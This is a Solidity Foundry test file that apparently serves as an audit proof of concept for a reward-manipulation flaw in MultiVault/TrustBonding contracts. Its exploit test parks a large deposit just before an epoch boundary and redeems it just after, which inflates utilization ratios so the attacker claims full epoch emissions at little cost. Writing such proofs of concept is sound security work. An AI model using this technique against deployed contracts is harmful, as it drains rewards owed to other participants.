// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import { Test } from "forge-std/src/Test.sol";

import { MultiVault } from "src/protocol/MultiVault.sol";
import { TrustBonding } from "src/protocol/emissions/TrustBonding.sol";
import { IBondingCurveRegistry } from "src/interfaces/IBondingCurveRegistry.sol";
import {
    GeneralConfig,
    AtomConfig,
    TripleConfig,
    WalletConfig,
    VaultFees,
    BondingCurveConfig
} from "src/interfaces/IMultiVaultCore.sol";

contract EpochBoundaryUtilizationManipulation_SingleFilePOC is Test {
    uint256 internal constant BASIS_POINTS = 10_000;
    uint256 internal constant DEFAULT_CURVE_ID = 1;
    uint256 internal constant EPOCH_LENGTH = 14 days;
    uint256 internal constant EMISSIONS_PER_EPOCH = 1_000 ether;
    uint256 internal constant SYSTEM_LOWER_BOUND = 5_000;
    uint256 internal constant PERSONAL_LOWER_BOUND = 2_500;
    uint256 internal constant ATTACK_DEPOSIT = 1_000 ether;
    uint256 internal constant LOCK_AMOUNT = 10_000 ether;

    address internal attacker = makeAddr("attacker");
    address internal admin = makeAddr("admin");
    address internal timelock = makeAddr("timelock");

    MockERC20 internal rewardToken;
    MockSatelliteEmissionsController internal controller;
    MultiVault internal multiVault;
    TrustBonding internal trustBonding;
    bytes32 internal atomId;
    uint256 internal startTimestamp;

    function setUp() public {
        startTimestamp = block.timestamp;

        rewardToken = new MockERC20("Wrapped TRUST", "WTRUST");
        controller = new MockSatelliteEmissionsController(address(rewardToken), startTimestamp, EPOCH_LENGTH, EMISSIONS_PER_EPOCH);

        TrustBonding trustBondingImpl = new TrustBonding();
        trustBonding = TrustBonding(
            payable(
                address(
                    new SimpleProxy(
                        address(trustBondingImpl),
                        abi.encodeWithSelector(
                            TrustBonding.initialize.selector,
                            admin,
                            timelock,
                            address(rewardToken),
                            EPOCH_LENGTH,
                            address(controller),
                            SYSTEM_LOWER_BOUND,
                            PERSONAL_LOWER_BOUND
                        )
                    )
                )
            )
        );

        MockCurveRegistry registry = new MockCurveRegistry();
        MockAtomWalletFactory factory = new MockAtomWalletFactory();

        GeneralConfig memory generalConfig = GeneralConfig({
            admin: admin,
            protocolMultisig: admin,
            feeDenominator: BASIS_POINTS,
            trustBonding: address(trustBonding),
            minDeposit: 0.01 ether,
            minShare: 1e6,
            atomDataMaxLength: 1_000,
            feeThreshold: 1 ether
        });
        AtomConfig memory atomConfig =
            AtomConfig({ atomCreationProtocolFee: 0.1 ether, atomWalletDepositFee: 50 });
        TripleConfig memory tripleConfig =
            TripleConfig({ tripleCreationProtocolFee: 0.1 ether, atomDepositFractionForTriple: 90 });
        WalletConfig memory walletConfig = WalletConfig({
            entryPoint: address(0x4337),
            atomWarden: admin,
            atomWalletBeacon: address(0xBEEF),
            atomWalletFactory: address(factory)
        });
        VaultFees memory vaultFees = VaultFees({ entryFee: 50, exitFee: 75, protocolFee: 125 });
        BondingCurveConfig memory bondingCurveConfig =
            BondingCurveConfig({ registry: address(registry), defaultCurveId: DEFAULT_CURVE_ID });

        MultiVault multiVaultImpl = new MultiVault();
        multiVault = MultiVault(
            payable(
                address(
                    new SimpleProxy(
                        address(multiVaultImpl),
                        abi.encodeWithSelector(
                            MultiVault.initialize.selector,
                            generalConfig,
                            atomConfig,
                            tripleConfig,
                            walletConfig,
                            vaultFees,
                            bondingCurveConfig
                        )
                    )
                )
            )
        );

        vm.prank(timelock);
        trustBonding.setMultiVault(address(multiVault));
        controller.setTrustBonding(address(trustBonding));

        rewardToken.mint(address(controller), 1_000_000 ether);
        rewardToken.mint(attacker, LOCK_AMOUNT);
        vm.deal(attacker, 20_000 ether);

        vm.startPrank(attacker, attacker);
        rewardToken.approve(address(trustBonding), type(uint256).max);
        trustBonding.create_lock(LOCK_AMOUNT, block.timestamp + 365 days);
        vm.stopPrank();

        atomId = _createMinimalAtom();
    }

    function test_control_withoutBoundaryParkingRewardsStayAtFloors() public {
        _seedEpochTwoTargets();
        _warpToEpoch(3);

        assertEq(trustBonding.getSystemUtilizationRatio(2), SYSTEM_LOWER_BOUND, "system ratio should stay at floor");
        assertEq(
            trustBonding.getPersonalUtilizationRatio(attacker, 2),
            PERSONAL_LOWER_BOUND,
            "personal ratio should stay at floor"
        );

        uint256 preClaimBalance = rewardToken.balanceOf(attacker);
        vm.prank(attacker);
        trustBonding.claimRewards(attacker);

        uint256 claimed = trustBonding.userClaimedRewardsForEpoch(attacker, 2);
        uint256 expected = EMISSIONS_PER_EPOCH * SYSTEM_LOWER_BOUND * PERSONAL_LOWER_BOUND / BASIS_POINTS / BASIS_POINTS;

        assertEq(claimed, expected, "control path should only receive floor-adjusted rewards");
        assertEq(rewardToken.balanceOf(attacker) - preClaimBalance, expected, "reward transfer mismatch");
    }

    function test_exploit_boundaryParkingMaxesUtilizationAndRewards() public {
        _seedEpochTwoTargets();

        _warpNearEpochEnd(2);
        uint256 nativeBalanceBeforeParking = attacker.balance;

        vm.prank(attacker);
        multiVault.deposit{ value: ATTACK_DEPOSIT }(attacker, atomId, DEFAULT_CURVE_ID, 0);

        _warpToEpoch(3);

        uint256 redeemableShares = multiVault.maxRedeem(attacker, atomId, DEFAULT_CURVE_ID);
        vm.prank(attacker);
        uint256 recovered = multiVault.redeem(attacker, atomId, DEFAULT_CURVE_ID, redeemableShares, 0);

        assertGt(recovered, 970 ether, "attacker should recover nearly all parked capital");
        assertLt(nativeBalanceBeforeParking - attacker.balance, 30 ether, "parking loss should stay small");

        assertEq(trustBonding.getSystemUtilizationRatio(2), BASIS_POINTS, "system ratio should cap at 100%");
        assertEq(
            trustBonding.getPersonalUtilizationRatio(attacker, 2),
            BASIS_POINTS,
            "personal ratio should cap at 100%"
        );

        uint256 preClaimBalance = rewardToken.balanceOf(attacker);
        vm.prank(attacker);
        trustBonding.claimRewards(attacker);

        uint256 claimed = trustBonding.userClaimedRewardsForEpoch(attacker, 2);
        uint256 controlClaim = EMISSIONS_PER_EPOCH * SYSTEM_LOWER_BOUND * PERSONAL_LOWER_BOUND / BASIS_POINTS / BASIS_POINTS;

        assertEq(claimed, EMISSIONS_PER_EPOCH, "attacker should capture the full epoch emissions");
        assertEq(rewardToken.balanceOf(attacker) - preClaimBalance, EMISSIONS_PER_EPOCH, "reward transfer mismatch");
        assertGt(claimed, controlClaim, "boundary parking should materially increase rewards");
    }

    function _createMinimalAtom() internal returns (bytes32 createdAtomId) {
        bytes[] memory atomData = new bytes[](1);
        atomData[0] = bytes("epoch-boundary-atom");

        uint256[] memory assets = new uint256[](1);
        assets[0] = multiVault.getAtomCost();

        vm.prank(attacker);
        bytes32[] memory ids = multiVault.createAtoms{ value: assets[0] }(atomData, assets);
        createdAtomId = ids[0];
    }

    function _seedEpochTwoTargets() internal {
        _warpToEpoch(2);

        vm.prank(attacker);
        trustBonding.claimRewards(attacker);

        assertEq(
            trustBonding.totalClaimedRewardsForEpoch(1),
            EMISSIONS_PER_EPOCH,
            "epoch 1 claim should seed the system target"
        );
        assertEq(
            trustBonding.userClaimedRewardsForEpoch(attacker, 1),
            EMISSIONS_PER_EPOCH,
            "epoch 1 claim should seed the personal target"
        );
    }

    function _warpToEpoch(uint256 epoch) internal {
        vm.warp(startTimestamp + epoch * EPOCH_LENGTH + 1);
    }

    function _warpNearEpochEnd(uint256 epoch) internal {
        vm.warp(startTimestamp + (epoch + 1) * EPOCH_LENGTH - 1);
    }
}

contract SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = keccak256("intuition.single.file.poc.proxy.implementation");

    constructor(address implementation, bytes memory initData) payable {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, implementation)
        }

        if (initData.length != 0) {
            (bool ok, bytes memory reason) = implementation.delegatecall(initData);
            if (!ok) {
                assembly {
                    revert(add(reason, 0x20), mload(reason))
                }
            }
        }
    }

    fallback() external payable {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            let implementation := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    mapping(address account => uint256) public balanceOf;
    mapping(address owner => mapping(address spender => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockSatelliteEmissionsController {
    MockERC20 internal immutable rewardToken;

    address public trustBonding;
    uint256 public immutable startTimestamp;
    uint256 public immutable epochLength;
    uint256 public immutable emissionsPerEpoch;

    constructor(address rewardToken_, uint256 startTimestamp_, uint256 epochLength_, uint256 emissionsPerEpoch_) {
        rewardToken = MockERC20(rewardToken_);
        startTimestamp = startTimestamp_;
        epochLength = epochLength_;
        emissionsPerEpoch = emissionsPerEpoch_;
    }

    function setTrustBonding(address trustBonding_) external {
        trustBonding = trustBonding_;
    }

    function getEpochLength() external view returns (uint256) {
        return epochLength;
    }

    function getEpochTimestampEnd(uint256 epochNumber) external view returns (uint256) {
        return startTimestamp + (epochNumber + 1) * epochLength;
    }

    function getEpochAtTimestamp(uint256 timestamp) external view returns (uint256) {
        if (timestamp <= startTimestamp) {
            return 0;
        }
        return (timestamp - startTimestamp) / epochLength;
    }

    function getEmissionsAtEpoch(uint256) external view returns (uint256) {
        return emissionsPerEpoch;
    }

    function transfer(address recipient, uint256 amount) external {
        require(msg.sender == trustBonding, "only trust bonding");
        require(rewardToken.transfer(recipient, amount), "transfer failed");
    }
}

contract MockCurveRegistry is IBondingCurveRegistry {
    function previewDeposit(
        uint256 assets,
        uint256 totalAssets,
        uint256 totalShares,
        uint256
    )
        external
        pure
        returns (uint256 shares)
    {
        return totalShares == 0 ? assets : _mulDiv(assets, totalShares, totalAssets);
    }

    function previewRedeem(
        uint256 shares,
        uint256 totalShares,
        uint256 totalAssets,
        uint256
    )
        external
        pure
        returns (uint256 assets)
    {
        return totalShares == 0 ? shares : _mulDiv(shares, totalAssets, totalShares);
    }

    function previewWithdraw(
        uint256 assets,
        uint256 totalAssets,
        uint256 totalShares,
        uint256
    )
        external
        pure
        returns (uint256 shares)
    {
        return totalShares == 0 ? assets : _mulDivUp(assets, totalShares, totalAssets);
    }

    function previewMint(
        uint256 shares,
        uint256 totalShares,
        uint256 totalAssets,
        uint256
    )
        external
        pure
        returns (uint256 assets)
    {
        return totalShares == 0 ? shares : _mulDivUp(shares, totalAssets, totalShares);
    }

    function convertToShares(
        uint256 assets,
        uint256 totalAssets,
        uint256 totalShares,
        uint256
    )
        external
        pure
        returns (uint256 shares)
    {
        return totalShares == 0 ? assets : _mulDiv(assets, totalShares, totalAssets);
    }

    function convertToAssets(
        uint256 shares,
        uint256 totalShares,
        uint256 totalAssets,
        uint256
    )
        external
        pure
        returns (uint256 assets)
    {
        return totalShares == 0 ? shares : _mulDiv(shares, totalAssets, totalShares);
    }

    function currentPrice(
        uint256,
        uint256 totalShares,
        uint256 totalAssets
    )
        external
        pure
        returns (uint256 sharePrice)
    {
        return totalShares == 0 ? 1e18 : _mulDiv(1e18, totalAssets, totalShares);
    }

    function getCurveName(uint256) external pure returns (string memory name) {
        return "Mock Linear Curve";
    }

    function getCurveMaxShares(uint256) external pure returns (uint256 maxShares) {
        return type(uint256).max;
    }

    function getCurveMaxAssets(uint256) external pure returns (uint256 maxAssets) {
        return type(uint256).max;
    }

    function count() external pure returns (uint256) {
        return 1;
    }

    function curveAddresses(uint256 id) external pure returns (address) {
        return id == 1 ? address(1) : address(0);
    }

    function curveIds(address curve) external pure returns (uint256) {
        return curve == address(1) ? 1 : 0;
    }

    function registeredCurveNames(string memory name) external pure returns (bool) {
        return keccak256(bytes(name)) == keccak256(bytes("Mock Linear Curve"));
    }

    function isCurveIdValid(uint256 id) external pure returns (bool valid) {
        return id == 1;
    }

    function _mulDiv(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return x * y / d;
    }

    function _mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y + d - 1) / d;
    }
}

contract MockAtomWalletFactory {
    function computeAtomWalletAddr(bytes32 atomId) external pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(atomId)))));
    }
}
